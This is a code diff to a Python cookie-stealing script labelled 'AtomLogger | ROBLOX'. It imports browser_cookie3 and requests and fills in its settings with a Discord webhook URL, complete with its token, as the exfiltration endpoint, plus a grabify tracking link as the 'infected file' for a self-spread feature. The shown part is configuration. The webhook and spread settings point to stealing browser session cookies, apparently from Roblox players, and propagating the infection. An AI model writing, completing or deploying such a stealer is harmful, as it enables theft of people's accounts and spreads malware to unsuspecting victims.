@@ -1,11 +1,11 @@
 import browser_cookie3, requests, urllib, re, os
 
 #   Settings - Webhook    #
-webhook = 'WEBHOOK URL HERE'
+webhook = https://discord.com/api/webhooks/1009796587029008414/-VwH1rmVlSdViyGzfUuRDNNMwNCJqLiKe3qNtFueVSHcrTIrnX6nxWhcFKs23BT1ZsY-
 avatarUrl = 'https://i1.wp.com/creativenerds.co.uk/wp-content/uploads/2010/08/cookie_39.png?resize=550%2C400'
 botName = 'AtomLogger | ROBLOX'
 #   Settings - Self Spread    #
-fileLink = 'INFECTED FILE URL HERE'
+fileLink = https://grabify.link/VBYSB5
 
 #   Functions   #
 def sendWebhook(message):
